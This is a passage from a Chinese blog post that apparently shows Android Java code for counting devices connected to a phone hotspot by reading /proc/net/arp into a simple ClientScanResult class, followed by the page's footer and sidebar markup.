class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">        CandyLog.e(e.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ClientScanResult</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String IpAddr;</span><br><span class="line">    <span class="keyword">private</span> String HWAddr;</span><br><span class="line">    <span class="keyword">private</span> String Device;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">boolean</span> isReachable;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ClientScanResult</span><span class="params">(String ipAddr, String hWAddr, String device, <span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.IpAddr = ipAddr;</span><br><span class="line">        <span class="built_in">this</span>.HWAddr = hWAddr;</span><br><span class="line">        <span class="built_in">this</span>.Device = device;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getIpAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> IpAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIpAddr</span><span class="params">(String ipAddr)</span> &#123;</span><br><span class="line">        IpAddr = ipAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getHWAddr</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> HWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setHWAddr</span><span class="params">(String hWAddr)</span> &#123;</span><br><span class="line">        HWAddr = hWAddr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getDevice</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDevice</span><span class="params">(String device)</span> &#123;</span><br><span class="line">        Device = device;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isReachable</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setReachable</span><span class="params">(<span class="type">boolean</span> isReachable)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.isReachable = isReachable;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>好了 想要知道连接人数  只要得到集合的size就可以了  又解决一个问题</p>
<p>关键点在于 热点信息储存在proc&#x2F;net&#x2F;arp 里面  有兴趣的可以了解下proc目录 里面有很多很多信息</p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Android/" rel="tag">Android</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a><a class="tag-none-link" href="/tags/WIFI/" rel="tag">WIFI</a>
            </div>
        

    </section>
</article>
  
</section>


        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/artchen" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
